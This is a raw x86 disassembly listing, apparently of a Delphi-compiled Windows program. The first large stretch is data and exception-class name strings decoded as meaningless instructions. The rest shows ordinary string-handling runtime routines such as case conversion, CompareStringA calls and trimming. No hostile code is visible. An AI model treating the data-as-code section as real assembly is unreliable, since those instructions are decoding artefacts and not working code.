add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
jb r-xdata
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
inc eax
add al dl
xor al [ eax ]
or al 0x33
rol al 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
js r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40787c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c004077 ] al
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x78
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
ja r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ esi + 0x40 ] 0x0
adc [ eax ] al
add [ eax ] al
sbb al 0x76
imul ebp [ edi + 0x6e ] 0x40766890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c004077 ] al
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] ch
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c004077 ] al
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x78d46564
inc eax
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
inc eax
add ah cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] ah
add [ eax ] dl
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0x40 ] bh
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] dl
jb r-xdata
inc eax
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ebp
jb r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x6e6f4345 ] cl
jbe r-xdata
inc eax
inc eax
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
mov ah 0x32
test [ ecx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x100040 ] al
add [ eax ] al
push esp
je r-xdata
insb
outsd
ja r-xdata
inc eax
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] dl
add [ eax ] al
add [ eax + 0x4c004077 ] al
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] bh
outsd
jb r-xdata
outsb
lea eax [ eax ]
clc
jpe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jns r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi - 0x40e7ffc0 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000407a ] bl
inc eax
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cmp al 0x7a
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
xor eax 0x32b40040
inc eax
add [ eax ] bl
mov edi 0x330c0040
jns r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
shr [ ecx + edi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi ] cl
shl [ edx ] 0x1
and al 0x78
inc eax
add [ eax ] al
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7b ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ edx + edi * 2 ] bh
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ edx ] cl
inc ebp
push eax
jb r-xdata
add [ eax ] dl
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
mov eax eax
add al 0x7c
inc eax
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
jpo r-xdata
insb
nop
push eax
jpo r-xdata
inc eax
rcr [ eax + 0x407a ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
outsd
insb
inc ebx
inc eax
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jl r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] dl
inc ebp
inc ecx
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
shl [ eax + 0x7c ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x7c
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ ebx + esi ] cl
shl [ edx ] 0x1
lodsb [ esi ]
jpo r-xdata
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi * 2 + 0xc0040 ] bl
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x7d
inc eax
add [ eax + eax ] cl
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
sar [ eax + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x100040 ] ch
add [ eax ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
in al dx
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ebp + 0x40 ] 0x1
inc ebp
jb r-xdata
inc eax
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
or al 0x33
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7d ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add ah ch
jae r-xdata
jb r-xdata
add [ esi + edi * 2 + r-xdata ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
je r-xdata
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
push esp
xor eax 0x32b40040
inc eax
push ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add al dl
jge r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jge r-xdata
jae r-xdata
add ah ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
adc [ ebp + 0x41 ] al
sbb al 0x7d
inc eax
add [ eax ] al
add [ eax ] al
loopne r-xdata
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esp + edx * 8 ] ah
xor eax 0x35600040
insb
jae r-xdata
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + 0x40 ] bh
add [ eax + eax ] al
add [ eax + 0x4c004010 ] dh
imul ebp [ edi + 0x6e ] 0x407de890
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407ed83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jg r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ esi + edi * 2 ] 0x40
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add al dl
xor al [ eax ]
enter 0x40d5 0x0
and al 0x54
add ah dh
jle r-xdata
xor eax 0x35580040
add eax 0xffffffd4
jmp sub_40d740
add al dl
xor al [ eax ]
and al 0xd4
je r-xdata
scasd [ edi ]
add [ eax ] al
je r-xdata
dec ebp
jne r-xdata
add al cl
aad 0x40
add [ esp + edx * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7f ] ah
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x354c0040 ] ah
inc eax
add [ eax ] bh
pop ebx
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ebx + ebx * 2 + 0x40 ] dl
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
call sub_403ad0
pop edi
pop esi
pop ebx
retn
call sub_40be84
push edx
popad
inc ebp
js r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
sar bh 0xff
insb
jne r-xdata
mov eax ebx
call sub_4026ec
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402d00
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_407f88
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407fbc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
pop edi
pop esi
pop ebx
retn
sub_407fe0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026ec
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402d00
mov eax esi
pop esi
pop ebx
retn
sub_408000
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_40270c
call ebx
pop ebx
retn
sub_40802c
push ebx
mov ebx eax
mov eax 0xc
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_408000
pop ebx
retn
sub_408064
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043d8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404764
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_4080a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043d8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404764
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_4080dc
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_40810c
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_40812c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408180
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_40812c
test eax eax
jne r-xdata
sub_4081a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043d8
mov ebx eax
mov eax esi
call sub_4045d8
mov edx eax
mov eax edi
mov ecx ebx
call sub_404208
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_4081d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043d8
push eax
mov eax esi
call sub_4045d8
push eax
mov eax ebx
call sub_4043d8
push eax
mov eax ebx
call sub_4045d8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408210
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043d8
push eax
mov eax esi
call sub_4045d8
push eax
mov eax ebx
call sub_4043d8
push eax
mov eax ebx
call sub_4045d8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408260
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408280
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4043d8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404118
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404638
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4082d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043d8
mov ebx 0x1
jmp r-xdata
cmp eax ebx
jl r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404638
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
inc ebx
sub_408304
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043d8
mov ebx eax
jmp r-xdata
test ebx ebx
jle r-xdata
push edi
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404638
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
dec ebx
sub_408338
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40844d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_4045d8
mov dl [ ebp - 0x5 ]
call sub_40cb64
mov ebx eax
test ebx ebx
je r-xdata
test esi esi
jne r-xdata
inc ebx
inc esi
mov dl [ ebp - 0x5 ]
mov eax ebx
call sub_40cb64
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov edx eax
add edx esi
add edx 0x2
mov eax edi
call sub_404764
mov edi [ edi ]
mov al [ ebp - 0x5 ]
mov [ edi ] al
inc edi
mov esi [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov eax esi
call sub_40cb64
mov ebx eax
lea eax [ ebp - 0xc ]
mov dl [ ebp - 0x5 ]
call sub_404300
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
mov dl [ ebp - 0x5 ]
call sub_404300
push [ ebp - 0x10 ]
mov eax edi
mov edx 0x3
call sub_404498
jmp r-xdata
inc ebx
mov ecx ebx
sub ecx esi
mov edx edi
mov eax esi
call sub_4028e8
mov eax ebx
sub eax esi
add edi eax
